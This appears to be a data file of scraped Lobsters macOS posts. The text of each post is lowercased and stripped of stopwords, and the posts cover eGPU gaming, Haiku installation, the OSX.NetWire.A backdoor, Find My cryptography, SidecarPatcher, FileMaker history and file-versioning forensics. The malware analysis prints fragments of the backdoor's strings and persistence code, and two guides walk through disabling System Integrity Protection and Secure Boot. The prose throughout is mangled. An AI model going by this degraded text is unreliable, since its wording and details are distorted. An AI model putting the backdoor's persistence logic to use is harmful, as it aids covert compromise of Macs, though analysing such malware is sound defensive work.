version face surface book much annoying device nt went picked logitech brio add desktop felt silly typing password support sealed deal lot laptop shipping standard hope continues make experience little bit seamless window update nt slow anymore one persistent meme around window computer harks way back window xp update infuriatingly slow seem like always happening nt want happy say microsoft made updating le painful window changing update process actually apply change background minimize amount time machine offline reboots update notify done need restart longer update restart normalspeed reboot switch last file waiting around minute hour machine update nt give keyboard layout day spent writing post like one infuriating thing notice immediately window poorly optimized keyboard layout getting em dash near impossible unless like altcodes struggled stumbled across typography layout thirdparty keyboard layout essentially delivers mac character set window making life whole lot easier great hardware choice one best thing switching sheer option come hardware macbook continues receive bump broken keyboard design year year window hardware keep getting better bunch new hardware like surface laptop huawei nextgeneration matebook lenovo carbon feel genuinely original highquality looking excited surface book might arrive newer technology like gorgeous oledequipped hp laptop zerothought app update big shift last twelve month appearance popular traditional apps window store everything slack discord flux spotify life fantastic side effect seamless update without ever thinking microsoft hone progressive web apps platform likely become norm great apps interact daily basis showing seems suspiciously absent visual studio code odd given microsoft actually owns project bad app story remains problematic one biggest hesitation people switch use fancy macosonly mail app ca nt live without may true come find use many native firstparty apps simply nt exist macos first place netflix plane without separate ipad yup even sync stuff offline native official apps messenger instagram telegram hulu plex surprising given nt macos counterpart still remains dearth inspiring apps like might see side year since something genuinely new arrived macos well argue great mac apps either stagnated disappeared entirely gap bad think feel like missed opportunity microsoft pulling flagship ipadfirst apps onto window apps like procreate sorely needed provide compelling sell stylus sad seem actively targeting popular apps hopeful designer developer looking something new jumping window encourage better beautiful weird idea promising sign unigram example exponentially better telegram client official one demonstrates possible build something great wsl performance unpredictable bash window generally great performance issue emerged point cause slowdown common task like npm install large commits related window defender churn file added installed causing disk performance degradation known issue month hundred developer chiming issue frustratingly microsoft largely ignored providing excuse problem promising look point future flagship developer feature disappointing problem persists even next major window update luckily bunch workarounds worry much like see better engagement community type problem ugly microsoft design language mess fluent design touted far back two year fantastic new direction window unfortunately remains largely idea reality microsoft seem gut implement across board properly fluent appears lot place still inexplicably inconsistent messy almost sort easy way understand implemented acrylicenabled apps pictured left look nicer older one pictured right new acrylic title bar example work specific subset apps ever actually seen edge making remarkably inconsistent see fluent control part o old nonsense others almost next even ask happens fluent get thrown last minute microsoft focus iterating fluent slowly mean chosen safer path mean never going see actually fulfill true destiny instead relegating place design team seems weight great example depending app place right click window get new style context menu pictured left get insane mess oldschool compatibility pictured right know nt seem like could nt worked around design need higher chain microsoft clearly seems like mandate implement properly disappointing even simple thing like rule around icon apps use appearing taskbar try align ecosystem make consistent feeling would good start microsoft need lead play safe taskbar weirdly broken still one area seems ignored entirely taskbar nt know microsoft scared piss user debacle window nt realize messy desperate need new thinking tray messa great example found bottom right corner desktop like think background dumping ground running task relegated drawer rule consistency visual hierarchy search forthcoming update could said microsoft separated cortana assistant wise left orphaned floating weird general ca nt search bar thought entirely new way love see fresh approach task bar dock future look like ca nt come something spacehugging array icon distraction least make feel consistent good time jump like thing technology good bad choice software great microsoft today listening well iterating really quickly adding useful feature consumer free window come long way since started using fulltime admire microsoft seems slowly surely adding kind feature actually matter platform missing little time cut deadweight break away old tired ui convention even mean compatibility pain short term window clearly turning something hardware consistently improving faster never easier switch considering making jump nt sure yet ask away comment happy share transparently type problem might run switch love much see hardware worth buying check laptop guide
179,Lobsters,mac,Apple macOS,Cramming a gaming GPU into your MacBook Pro,https://justin.searls.co/posts/gaming-with-a-mac-plus-egpu/,cramming gaming gpu macbook pro,cramming gaming gpu macbook pro actually got regard gpu performance high sierra release mac pro able take topoftheline gaming gpu seat inside external box plug box computer single highbandwidth necessary instruction render game frame per second card cable pushing frame back notebook builtin monitor without introducing perceptible latency vr experience opposed razer get started egpuio hardware software initial question might macbook pro thread amd card nvidia tremendous pain rtx razer core decent option external monitor macbook pro window error stepbystep instruction assembling egpu setting macos installing window via boot camp anything else disconnect egpu downloading window microsoft web page enabling window system protection running ddu take control window gpu driver downloaded version clean restart install gpu driver next finally plug egpu nt click restart restart egpu connected thread adjust window sleep setting run benchmark unigine superposition benchmark install refind boot manager refind error download binary zip file disable secure boot system integrity protection efi system partition nvram folk egpuio forum regpu subreddit,cramming gaming gpu macbook actually thathow got hereafter apple released soontobe previous generation mac pro probably nt take long realize trash fire hand especially regard gpu performance apple announced egpu support macos high sierra release hard see announcement anything admission apple topoftheline desktop notebook shipped subpar gpus due severe thermal constraint course apple never considered aaa gaming important function product mac always lagged behind window gpu availability support new mac pro tower release fall situation especially grim even workstation task like video encoding modeling internal gpus apple selling bad driving nontrivial number creative market apple actually care platformthe world may excited close door illconceived trash mac pro nt glaring design flaw apple intel probably would nt prioritized engineering needed make running egpu thunderbolt commercial realityso thanks trash mac pro truthfully said instead putting beefy graphic card inside computer able take topoftheline gaming gpu seat inside external box plug box computer single highbandwidth necessary instruction render game frame per second card cable pushing frame back notebook builtin monitor without introducing perceptible latency seen daily evidence last month got ta say pretty freakin coolthe idea able connect gpu cable get desktopclass gaming performance current crop macbooks pro seems farfetched even literally play game one reasonable people encounter apple marketing focused creative professional workflow like modeling vr experience opposed experiencing would unreasonable make logical leap say ah yes surely boot computer window egpu enclosure would necessary driver thunderbolt cable would necessary bandwidth render game realtime acceptable frame rate input latency yet aaa pc gaming actually within reach recent macbook pro paired egpu nobody razer telling market thathow get startedi pieced together dozen forum post guide build data smallbutdedicated community egpuio verynewest mac egpu enclosure operating system release made thing much easier late much content popular guide longer relevant therefore try document strippeddown walkthrough start fresh latest operating system hardware componentshardware software macos window version initial question might havewhat macbook pro macbook pro may beefier actually pain set purpose convincing window yield egpu instead discrete amd gpu model ship take bit work guide suit fine thread might provide guidance beyond offer herewhy amd card nvidia plan ever plugging egpu macos opposed window going much easier time amd card macos ship driver amd card nvidia support tremendous pain getting worse time zero mac driver available new rtx linewhy razer core chose model lightweight mere pound properly isolates bandwidth usb port relatively small liter ca nt help much heat noise though truth actually quite decent option incorporate thunderbolt controller heavy liftingwhy external monitor macos window loopback frame rendered egpu cable onto computer builtin monitor operating system support recent introduces nonzero bandwidth cost result lower framerates well frame dropped adding relatively high dpi apple display make running game native resolution demanding monitor designed pc gamingwhat macbook pro mac thunderbolt port later able figure way make work increased amount window futzing year go back initially set macbook pro wound spending six seven hour applying various salve incantation try work around window error nonsense device manager spew window ca nt figure get sufficient bandwidth memory addressed egpuok way let see look like set upstepbystep instructionsat risk verbose decided document literally every little step process took setting thing even minor gap found people build online would often mask tremendous complexity took hour figure ownassembling egpustart unboxing gpu egpu enclosureso radeon vii card razer core egpu enclosure razer egpu model simple handle locking mechanism make easy get pci slot release mount card mounting card pretty simple remove io plate facade push card pin slot connect enclosure two atx power connector top card look like slide back place opt cheaper quieter larger razer core x idea size difference finally look like thrown onto desk monitor keyboard egpu ship hilariously short cable want reach active meter cable soon possiblesetting macosthis one easy update macos current release version writing version newer plug egpu enclosure power outlet connect computer via thunderbolt cable immediately see recognized mac view macos truly plugandplay game run macos able immediately take advantage egpuif certain apps need extra push use gpu tell macos present gpu checking prefer external gpu application get info dialog finder hot plug egpu machine time running computer think fair say merely warm unplug first supposed tell macos force restart apps currently depending egpu via menu bar option fail yank cable without first unmounting egpu macos yell proceeding forcerestart apps running pretty much using egpu macos entire experience invisible seamless apple engineer deserve commendedinstalling window via boot campbefore anything else disconnect egpu safe plug window let know process nt changed much last year start downloading window midjune recent downloadable version window installer october release downloaded launch boot camp assistant download support software ask window disk image download complete may detect automatically prompt choose partition size boot camp assistant still finicky afp volume regularly report failure attempting partition diskwhen happens quit app reboot try never taken least two try working booted window installer important step actually entering product key done later ensuring pick edition window want license case window pro next thing look window boot appledeployed script run launch boot camp installer contains machine driver definitely want install immediately anything else subsequent window release dramatically improving egpu support anything else want upgrade latest available stable version reference installer started window version nt latest major releasethe recent release time window especially precious roll system update across install base actually expose mechanism operating system tell shut give latest greatest forcetrigger release visiting particular microsoft web page clicking update however weirdanyway take entirely long download go make sandwich guess afraid continuing configuration many thing likely improved newer release recommend waiting update finish enabling window system protectiononce window updated restarted want create system restore point easily unwind driver configuration change make run trouble hitting window key searching restore point open dialog click configure restore setting subsequent dialog box choose turn system protection default click ok previous pane able click create restore point asked name restore point give whatever name want running ddu take control window gpu driversnext window builtin method locating installing gpu driver often interfere chipmakers software prior plugging egpu installing amd nvidia driver actually want uninstall gpu driver prevent window update attempting install new one done program called ddu downloaded used version website look like every official home software run window download link nt display ad disappear every second part timed carousel animation wait time click successfully download took fewer three triesonce installed run complain window safe mode time writing mix hardware software actually nt appear possible boot window safe mode boot camp launched ddu anywaysince going install radeon card selected amd dropdown box near topright ui resulting app shading like open option check prevent downloads driver window update box bottom page prevent window update attempting install gpu driver window update nt normally screw gpu driver thing initially set likely going connecting disconnecting gpu much greater regularity ever would traditional pc tower much le four different thunderbolt port risk much greater window screwing gpu driver attempting configure egpuokay checking prevent downloads close option menu click clean restart topleft corner ddu interface may warn ignore using window two hour point already dismissed twenty pointless warning dialog done restart hit window key type restore point create second restore point run ddu downloaded gpu driver install gpu driversnext finally plug egpu give window minute egpu warms detect thunderbolt controller open device manager see display adapter named microsoft basic display adapter check property driverless display adapter look like great mean window connecting egpu enclosure thunderbolt controller fine tell gpu plugged itnext want install driversthe installation process dead simple fully automated either prompt restart window nt click restart instead shut computer entirely unplug egpu boot login plug egpu back inwhy restart egpu connected handwavy short version window boot normally mac egpu connected device initialized way efi boot loader work expected case meant window could never successfully boot egpu connected boot time mean outofthebox probably need plug egpu window booted logged way around explain talk refindanyway booted replugged egpu go back device manager luck gpu recognized within second see model name card put case view property amd radeon vii display adapter everything look good really good chance however see yellow exclamation point gpu icon instead device working properly greeted error message device nt sufficient resource read either memory addressing bandwidth used see gpu wo nt engage troubleshoot bunch idea thread work depends combination factorsbefore get deep weed trying solve however sure try connecting egpu four thunderbolt port macbook pro separated system reboot may case one work reliably model leftfront port typically available bandwidth thunderbolt pcie device case window report device working properly mean able drive external display connecting one card output port may able imagine requires significantly le bandwidth looping back builtin monitor information involved traveling one direction instruction move computer egpu rendered frame go egpu onward monitor connected second monitor want ensure thunderbolt bandwidth wasted driving macbook display hit windowsp repeatedly select second screen effectively disabling notebook display window adjust window sleep settingsseveral egpu enclosure well specific card really hard time figuring fan window go sleep case every time window slept closed macbook pro lid gpu enclosure fan began spinning speed loud measured meter awayto avoid went disabled window sleep everywhere couldfirst hit window key type power bring basic power preference changed set plugged pc go sleep never nt form real sentence solve primary problem egpus freaking window sleep note safe allow sleep battery power since egpu enclosure supply power system thunderbolt cable never plugged connectednext click additional power setting stumble around find energy setting page important able close lid without triggering window sleep plugged see also disabled sleep pressing power button well removing sleeprelated option start menurun benchmarksfrom start installing trying game verify everything working expect might make sense run benchmark free one might try unigine superposition benchmark able stress gpu currently marketif familiar benchmark basically complex rendered gamelike environment scripted opposed interactive running minute demo benchmark usually enough heat gpu measure performs loadbecause connected monitor ran benchmark optimized setup yielded score whatever mean razer core really nt hide noise addition running fairly hot definitely pretty loud meter away used modern gpus six foot away tv massive noisedampening case screech whine result gpu put work terrify something wrong zero actual indication anything paranoidinstall refind boot managerto work around issue egpu initialized improperly boottime booting window egpu connected use refind boot manager specifically pretend booting macos time boot window purpose hardware initialization sound dumb really isonly proceed section installing refind want able perform cold boot window without first disconnecting egpu silly amount security compromise complexity small quality life improvement going switching window macos frequently using headless mac like mac mini struggling overcome error installing refind might worth youfirst download binary zip file linked project page extract directory someplace find easily command line next step put mine home directory secure bootif mac chip preconfigured boot appleapproved operating system refind certainly disable feature reboot mac recovery mode holding commandronce recovery mode utility menu open startup security utility enter administrator password look like use refind need select security secure boot toggled quit appnext utility menu launch terminal app need disable system integrity protection sip write efi system partition esp terminal execute csrutil disable take effect need restart mac hold commandr reboot recovery mode yet againonce back recovery mode need mount main mac partition get access refind installer downloaded previously launching disk utility utility menu clicking macintosh hd clicking mount toolbar button filevault enabled mounting drive require user password unlock quit disk utility open terminalnow disk mounted navigate home directory case cd volumesmacintosh hdusersjustin run refind install script placed right script mount efi system partition volumesesp install bless mac nvram upon boot refind first thing executedbefore installer exit also report copied configuration file refindconfwe need edit file enable macos hardware spoofing window chance booting successfully egpu connectedrun command open vim edit configuration file vim volumesespefirefindrefindconf nt know vim nt worry lot follow exactly keystroke type spoof hit enterposition cursor character beginning line read spoofosxversion use arrow key hit x key delete effectively uncommenting ittype wq hit enter write file quit vimcongratulations know vim quit terminal shut machinenow time boot treated really ugly splash page remind year linux desktop whichever year boot window macos hardware spoofing boot first item left use arrow key enter launch macos want select second option useful keep mind refind automatically boot previously used partition second timeout handy boot clamshell mode going see screen external display wait eventually machine boot whatever operating system used recentlyif need switch operating system across boot need either hit correct arrow key right time crack lid see going onthat folk congratulation tired want play game nowcapableofrunningthem macbook probut seriously egpus represent exciting branch enthusiast computer hardware era increasingly mundane bythenumbers computing upgrade niche little known clearly ton investment made multiple hardware manufacturer new enclosure hitting market quarter apple microsoft operating system release last two year improved egpu support intel whose thunderbolt api egpu spec realized dream plugandplay interoperability hundred enclosureandgpu combinationsit interesting see thing go even nt imminent plan build travelfriendly pc gaming battle station might want keep tab egpuio forum regpu subreddit every sort gaming configuration getting easier
180,Lobsters,mac,Apple macOS,Install Haiku on a Core Duo 2006 MacBook Pro (17-inch),https://tinyapps.org/docs/haiku/,install haiku core duo macbook pro,tinyappsorg doc install haiku core duo macbook pro download press key,tinyappsorg doc install haiku core duo macbook pro download version burn dvd boot macbook pro dvd press key haiku splash screen appears welcome screen click run installer continue set partition click internal disk eg disk initialize intel partition map continue write change ok click new line immediately partition create check active partition create write change partition format file system continue initialize write change ok close drivesetup back installer select new haiku partition next onto click begin start installation installation completes click tool set boot menu click internal drive install next next next set timeout desired next next write boot menu done close installer window restart system far performant graphical o hardware note created
181,Lobsters,mac,Apple macOS,Burned by Fire(fox),https://objective-see.com/blog/blog_0x43.html,burned fire fox,osxnetwirea sample background firefox philip martin interesting thread persistent mac backdoor whatsyoursign match submitted wirenet passwordstealing trojan land linux o x uxprotect uxprotect apple update xprotect malware definition netweirdrc blockblock block blocking login item knockknock conclusion gatekeeper exposed come see conquer may changing,burned fire fox part firefox drop macos backdoor osxnetwirea june research tool writing supported friend objectivesee today blog post brought want play along shared osxnetwirea sample password infect background little week ago received email user stated last week wednesday hit asyetunknown firefox somehow dropped binary executed mac let know would interested analysing binary might something interesting wrt bypassing osx gatekeeper course intrigued time wrapping objective sea read dust cleared conference wanted dig attack analyze persistent malware firefox user contacted much information firefox exploit used attack however information readily available first able obtain email said user claimed related attack dear xxx name neil morris one adam prize organizer year update team independent specialist could ass quality competing project http colleague recommended experienced specialist field need assistance evaluating several project adam prize looking forward receiving reply best regard neil morris even attacker browser exploit still find way deliver target individual targeted delivery mechanism choice often email contains link malicious site throw exploit user visit said site unfortunately link currently return found curl http doctype html public ietfdtd html html head title found title head body found p requested url found server p hr address ubuntu server peopledscamacuk port address body html course possible site serve throw exploit user browse site via vulnerable version firefox perhaps certain ip address etc likely though attacker moved taken exploit site though access exploit code user able provide persistent malware exploit installed system named finderapp woohoo remainder blog cover analysis malware hash shasum attackfinderappcontentsmacosfinder finder interestingly today security researcher coinbase philip martin posted interesting thread twitter note hash mentioned phil match malicious file user sent moreover user confirmed involved cryptocurrency exchange fairly recently thus seems reasonable assume talking firefox patched covered various article however detail persistent malware used attack scant nonexistent let dive persistent mac backdoor osxnetwirea noted infected user kind enough send malware finderapp attacker persistently installed system via firefox via opensource whatsyoursign utility quickly see unsigned application searching hash virustotal found exact match show file submitted currently detected one av engine tencent full application bundle finderapp submitted virustotal today similarly detected one av engine interestingly engine detecting malware flag osxnetwire osxnetwire osxwirenet first discovered dr web writeup wirenet passwordstealing trojan land linux o x state first trojan history steal linux mac o x password password stolen via keylogger logic andor directly file disk ie saved browser logins string slibraryoperawanddat slibraryoperawanddat seamonkey thunderbird slibraryapplication supportfirefox ssignonssqlite nssinit select mozlogins osxnetwire new sample really still osxnetwire personally heard anything osxnetwire since decided poke around first via simple string matching easy confirm sample someway related example note string sample esi binsh access esi esi binbash eax write sample stat binsh edi ebp binbash write ebx rather unique string also found sample whilst chatting one close security researcher friend noted new sample already detected xprotect rather skeptical claim recall recent xprotect update osxnetwire turn absolutely right apple added yara signature detect something called osxnetwirea signature found systemlibrarycoreservicesxprotectbundlecontentsresourcesxprotectyara presented rule netwirea meta description osxnetwirea string exitexit b useragent window nt like geckoaccept texthtml applicationxhtmlxml applicationxml imagewebp condition digita uxprotect utility graphically display signature well also utilize uxprotect confirm signature still detects malware used firefox attack wow kudos apple writing signature imho rather surprisingly detects still detects new threat interestingly apple signature detect sample contain useragent mozilla string first many indicator sample somehow related unsurprisingly personally aware public detail related new sample interestingly intego wrote brief article apple xprotect apple update xprotect malware definition netweirdrc however others reference link back sample already noted detected apple osxnetwirea yara signature often case apple know thing like share though maybe share thing sample clearly related also different get part two blog post dive capability new malware sample however short sample totally different objective guess written author team serve unique purpose ie sample concerned stealing password wrap part one post let look new sample osxnetwirea persists quick peek malware disassembly reveals embedded launch agent plist memcpy esi xml version encoding n doctype plist public apple computerdtd plist http n plist version n dict n key label key n string string n key programarguments key n array n string string n array n key runatload key n true n key keepalive key n n dict n plist eax getenv home eax snprintfchk slibrarylaunchagents eax eax snprintfchk edi splist seems reasonable assume malware persist launch agent however also appears contain logic persist login item note call lssharedfilelistinsertitemurl api eax snprintfchk sapp eax cfurlcreatefromfilesystemrepresentation eax eax lssharedfilelistcreate klssharedfilelistsessionloginitems eax lssharedfilelistinsertitemurl eax klssharedfilelistitemlast edi hopping vm running malware turn persists twice first launch agent commachostplist login item cat librarylaunchagentscommachostplist keepalive label commachost programarguments usersuserdefaultsfinderappcontentsmacosfinder runatload launch agent commachostplist runatload key set o automatically launch specified binary defaultsfinderappcontentsmacosfinder time user log login item also ensure malware launched login item however show ui clearly detracting malware stealth persisting twice better really especially running objectivesee lovely tool blockblock detects persistence attempt detail persisting login item role backgroundtaskmanagementagent see recent blog post block blocking login item knockknock also reveal infection fact detecting malware persistence maybe malware author wanted extra extra sure gaining andor maintaining persistence conclusion today post discussed persistent payload rather sophisticated targeted attack cryptocurrency exchange via firefox attacker persistently deployed macos binary rather interestingly malware osxnetwirea bares relation specimen name similarly intriguingly showed signature deployed apple would detects malware would recall original email infected user noted malware bypassed gatekeeper actually unsurprising malware delivered remote exploit gatekeeper scan application quarantine attribute set added application ie browser o application downloaded via normal mean ie user exploit code downloads payload malicious application set quarantine attribute remove thus trigger gatekeeper highlighted well known fact presentation gatekeeper exposed come see conquer xprotect similarly operates file quarantine bit set however may changing macos catalina thus thanks infection vector firefox neither gatekeeper xprotect would protect user clearly never wise leave security soley cupertino
182,Lobsters,mac,Apple macOS,The Clever Cryptography Behind Apple's 'Find My' Feature,https://www.wired.com/story/apple-find-my-cryptography-bluetooth/,clever cryptography behind apple find feature,worldwide developer conference keynote monday immediately wondered marketer snoop tracking public key encryption setup hash,apple executive craig federighi described new locationtracking feature apple device company worldwide developer conference keynote monday sufficiently paranoid physical security innovation potential privacy disaster security expert immediately wondered whether find would also offer new opportunity track unwitting user apple say built feature unique encryption system carefully designed prevent exactly sort apple itselfin upcoming version io macos new find feature broadcast bluetooth signal apple device even offline allowing nearby apple device relay location cloud help locate stolen laptop even sleeping thief bag turn apple elaborate encryption scheme also designed prevent interloper identifying tracking idevice bluetooth signal also keep apple learning device location even allows pinpoint amazing whole interaction endtoend encrypted anonymous federighi said wwdc keynote us tiny bit data piggyback existing network traffic need worry battery life data usage privacy seen anyone actually deploy anything like billion people matthew green john hopkins universityin background phone call wired following keynote apple broke privacy element explaining encrypted anonymous system avoids leaking location data willy nilly even device broadcast bluetooth signal explicitly designed let track device solution paradox turn trick requires least two apple device one emits constantly changing key nearby apple device use encrypt upload geolocation data apple device posse key decrypt locationsthat system would obviate threat marketer snoop tracking apple device bluetooth signal allowing build history every user location apple thing right lot ifs sound like could done private way say matthew green cryptographer john hopkins university even tracked walking around able recognize person one hour next fact find cryptography go one step denying even apple ability learn user location based bluetooth beacon would represent privacy improvement apple older tool like find iphone find friend nt offer safeguard apple learning locationhere new system work apple describes step step first set find apple apple confirmed need least two device feature generates unguessable private key shared device via endtoend encrypted communication machine posse keyeach device also generates public key public key encryption setup public key used encrypt data one decrypt without corresponding private key case one stored apple device beacon device broadcast via bluetooth nearby devicesthat public key frequently change rotating periodically new number thanks mathematical magic new number nt correlate previous version public key still retains ability encrypt data device decrypt apple refused say often key rotates every time change make much harder anyone use bluetooth beacon track movementssay someone steal macbook even thief carry around closed disconnected internet laptop emit rotating public key via bluetooth nearby stranger iphone interaction owner pick signal check location encrypt location data using public key picked laptop public key nt contain identifying information since frequently rotates stranger iphone ca nt link laptop prior location eitherthe stranger iphone uploads two thing apple server encrypted location hash laptop public key serve identifier since apple nt private key ca nt decrypt locationwhen want find stolen laptop turn second apple say contains private key laptop generated series rotating public key tap button find laptop ipad uploads hash public key apple identifier apple search million upon million stored encrypted location find matching hash one complicating factor ipad hash public key wo nt one stolen laptop since public key likely rotated many time since stranger iphone picked apple nt quite explain work john hopkins green point ipad could upload series hash previous public key apple could sort pull previous location laptop spottedapple return encrypted location laptop ipad use private key decrypt tell laptop last known location meanwhile apple never seen decrypted location since hashing function designed irreversible ca nt even use hashed public key collect information device
183,Lobsters,mac,Apple macOS,SidecarPatcher: Enable macOS 10.15 Sidecar on old Mac (2015 or older),https://github.com/pookjw/SidecarPatcher,sidecarpatcher enable macos sidecar old mac older,sidecarpatcher mactracker io app store freesidecar patch issue command line tool apple developer website system integrity protection turn system integrity protection mac system integrity protection terminal warning issue revert simplest method macos combo update macos combo update macos catalina combo update simplest method install macos catalinaapp using backup system integrity protection turn system integrity protection mac,sidecarpatcher enables sidecar old mac ipad macos sidecar disabled device apple ipad type terminal get model identifier mac sysctl hwmodel get model identifier ipad using app mactracker io app store script disables blacklist macos patch ipados root system jailbreaking required command line script want gui application try freesidecar benz tested macos nt work macos patch unstable many known issue read issue please use risk backup systemlibraryprivateframeworkssidecarcoreframework folder script nt provide original system file install latest version command line tool apple developer website requires apple developer account use freetier developer account disable system integrity protection turn system integrity protection mac disabling system integrity protection reboot normal macos check sip disabled csrutil status open terminal application clone repository running command git clone http githubcompookjwsidecarpatcher run mainswift sudo swift sidecarpatchermainswift need enter macos password ignore warning encounter error nt know fix upload log issue ca nt reply issue nt know xcrun error crashing many apps rebooting revert simplest method reinstall macos using macos combo update download macos combo update example using macos catalina download macos catalina combo update wo nt erase data reinstall system simplest method reinstall macos using install macos catalinaapp install without erasing disk wo nt erase data reinstall system using backup disable system integrity protection turn system integrity protection mac check sip disabled csrutil status run sudo mount uw command copy original sidecarcore folder sudo cp pathtooriginal systemlibraryprivateframeworkssidecarcoreframework make sure put right path sidecarcore pathtooriginal set permission sudo chmod r systemlibraryprivateframeworkssidecarcoreframework reboot want enable system integrity protection testing
184,Lobsters,mac,Apple macOS,FileMaker Early History,https://web.archive.org/web/20050206033639/http://www.dancing-data.com/filemakerhist.html,filemaker early history,wikipedia home contact u,origin filemaker pro glenn koenig based telephone interview spec bower december last updated april history filemaker start back early four people originally worked wang laboratory headquartered lowell massachusetts spec bower alan albert dan chadwick jega arulpragasam wang lab political culture back inside track essentially chinese would get support getting thing done four wanted develop new product culture wang nt open time wang marketed subset mind realized would nt chance everything wanted set decided try something small build wang almost alone word processing ibm started marketing pc around time spec dan attended computer conference day computer conference business concentrated mini computer larger outside hall tent small section devoted pc looked around saw number company already working word processing product concluded would hard break market looked database software opinion existing database awful dbase one user interface prompt single dot left edge screen know command type correctly anything record fixed format field fixed length type decide everything ahead time started entering data design database essentially frozen place could nt change anything well knew good user interface looked like working wang decided make something better around formed nashoba system started home long rented space building concord massachusetts sudbury road spec bower came initial design concept field variable length enter much data want every word every field indexed add field time delete display data different layout user interface would menu driven mouse came later would good performance even large database initially would support date number text calculation field type basic important characteristic first product called nutshell developed marketed company called leading edge leading edge marketed pc clone software time image show slightly later version click image see larger image side box soon nutshell market macintosh introduced leading edge refused sell mac market nashoba developed version macintosh use different name came filemaker people saw filemaker later would say look lot like nutshell different name people nt know essentially product image show slightly later version click image see larger image side box close finishing filemaker suddenly microsoft released microsoft file looked pretty good nervous went ahead released filemaker microsoft started big seller within year filemaker neck neck year filemaker outsold m file microsoft took product market somehow ordinary person looked product saw difference day microsoft huge probably succeed filemaker started well right beginning good design marketing almost competition mac side whereas leading edge nt market nutshell well competition pc side dbase pfs number publisher time pfs word pfs file pfs number etc several established product interesting aside nutshell filemaker never problem designed date range year least essentially solved year became hot topic around mid late company called forethought market filemaker great relationship forethought even though started slowly time nashoba forthought went financial difficulty jega came idea looked like forethought big trouble changed agreement publishing like partnership way succeeded went best selling database spec think ought lesson teach harvard business school decided track name macintosh product naming successive version filemaker apple came mac plus named next version filemaker plus apple introduced mac ii called filemaker ii million worth business early microsoft bought forethought microsoft probably thought going get right market filemaker deal spec say thought awful lawyer got powerpoint even though nt much track record even category nt big yet perhaps microsoft reasoned nashoba system smaller company without publisher would place else go nashoba still right filemaker decide sell microsoft anyway perhaps find another publisher self publish microsoft offered royalty deal month filemaker product making year even without microsoft label nashoba declined offer eventually decided self publish course product would market awhile geared kind scary hired marketing people forethought based previous contract forethought nashoba right software documentation packaging big crash effort write documentation scratch put rest product together decided name filemaker make decision little thing find package buy software warranty reply card kind box package design license wording pretty scary short time frame spite went back market new problem arose hired marketing vp forethought wanted president company almost like extortion four cofounder split promotion eventually one founder gave promoted within month morale nashoba gone downhill badly time marketing still california technical people massachusetts president california office staff took control documentation tech support everything else told founder good little geek go write code back concord employee dwindled people within month two original founder quit well spec one founder still owned almost company shortly claris approached asked could buy enough support among founder vote turned claris nt like dealing nashoba new president either kept adding condition deal deal survived claris got product claris began using conventional version number instead varying name product version claris first version since apple wanted claris appear market stand alone software brand name trying make pc do window version product claris filemaker first expanded run window claris could nt update nutshell sell instead right filemaker much well recognized name claris wholly owned subsidiary apple computer later apple dissolved claris set filemaker inc two product filemaker homepage product claris name reverted apple brand name discontinued filemaker inc dropped support homepage year later develops filemaker spec remark feature thought year ago still nt product version cross tab still nt product still ca nt summarize horizontally vertically time also way import pdf file adobe acrobat layout irs form would great note information concerning history filemaker available site also contributed article wikipedia home contact u
185,Lobsters,mac,Apple macOS,Digging up the Past: OS X File Versioning,https://versprite.com/blog/security-research/file-versioning-mac-os-x/,digging past o x file versioning,back blog home textedit john doe navigating cloned image find peruid crash course o x versioning system generation alluids peruid chunk storage documentrevisions old mac documentrevisions storage schema documentrevisions peruid old mac file sqlite doe generation doe johnrtf doe john rtf dbsqlite old mac cschunkstoredatabase cschunktable coup de grâce version recovery old mac c exec find chunkstorage cschunktable chunkstoragedatabase generation dbsqlite generation file john doe note janertf digital forensics security research dfir research,back blog home began request u recover version history document created using apple textedit application handed older macbook name person interest goal recover every version textedit document referenced individual found rather interesting foray o x digital forensics sake confidentiality use name john doe person interest redact modify sample output technical process remain untouched navigating cloned image begin attempted clone drive booting device target disk mode tdm using disk imaging hardware create carbon copy target hard disk estimated take several hour started process left work overnight unsupervised dismay process failed somewhere along way approach proving painstakingly slow unreliable u fell back software solution cloning disk image avoid possible compatibility issue used macbook forensic operation attached external drive containing cloned image macbook mounted image inspect content disk image mounted used find command line utility identify file may relate john doe find iname doe desktopddoe coachedpdf desktopddoe johnrtf desktopddoe john rtf desktopddoe desktopddoe desktopddoe desktopddoe desktopnew folder itemsdoe coach notesrtf desktopnew folder itemsdoe coach note copyrtf searched file directory may relate o x versioning system noticed folder root directory named within hidden directory found folder named peruid well sqlite database resource appeared either empty unused result online research suggested right track decided investigate bit directory better understand looking crash course o x versioning system version introduced o x around version turn textedit one lucky natively supported apps textedit leverage versioning system make easy user revert previous version text document o x volume includes hidden directory named may contain historic iteration supported file called generation hidden directory may also contain versioning metadata chunked revision data document generation stored within either alluids peruid subdirectory also sqlite database located containing metadata pertaining file version sqlite database containing metadata pertaining chunk storage file chunk storage data file located nested subdirectory data file contain binary chunk record may parsed retrieve revision data addition chunk record small file textedit rtf document may contain entirety revised file although uncovered lot helpful information regarding o x versioning system mounted directory appeared largely unused upon closer inspection noticed another folder named documentrevisions old mac bit research revealed directory result transferring data older macbook newer macbook using migration assistant migration assistant used copy item already exists new device newly copied item old mac appended name documentrevisions storage schema armed newly found knowledge versioning system dug deeper imported documentrevisions directory first thing noted peruid subdirectory longer unpopulated contained handful pdf file presumed revised edition identically named file within user document next noticed database old mac populated valuable data file table database contains several column pertaining version file metadata including file name storage id using sqlite command line utility queried row file name containing string doe returning dozen entry sqlite schema file create table file filerowid integer primary key asc filename text fileparentid integer filepath text fileinode integer filelastseen integer null default filestatus integer null default filestorageid integer null filedocumentid integer unique filedocumentid create index filesnameparentididx file filename fileparentid create index filepathidx file filepath create index filesstorageididx file filestorageid create index filesstatusidx file filestatus create index filesinodeidx file fileinode generation table contains detail file generation entry includes generation size time added generation name uuid value share name original file sqlite schema generation create table generation generationid integer primary key asc generationstorageid integer null generationname text null generationclientid text null generationpath text unique generationoptions integer null default generationstatus integer null default generationaddtime integer null default generationsize integer null default generationprunable integer null default create index generationsoptionsidx generation generationoptions create index generationsstatusidx generation generationstatus create index generationsaddtimeidx generation generationaddtime desc create unique index generationsstorageidnameclientid generation generationstorageid generationname generationclientid identify generation entry file related john doe used following query cross reference storage id value match generation file sqlite select filename file filename like doe filestorageid select generationstorageid generation doe coach notesrtf doe coach note copyrtf john doe note janertf document appear correspond doe file found among user document however generation entry file found doe johnrtf doe john rtf addition dbsqlite database old mac cschunkstoredatabase also longer empty cschunktable table database provide u chunk id offset data length timestamp chunk sqlite schema cschunktable create table cschunktable ctrowid integer primary key cid blob ctiid bigint ftrowid bigint offset bigint datalen integer refcount integer timestamp bigint location integer key blob create index cschunktablecidinx cschunktable cid create index cschunktableiidinx cschunktable ctiid create 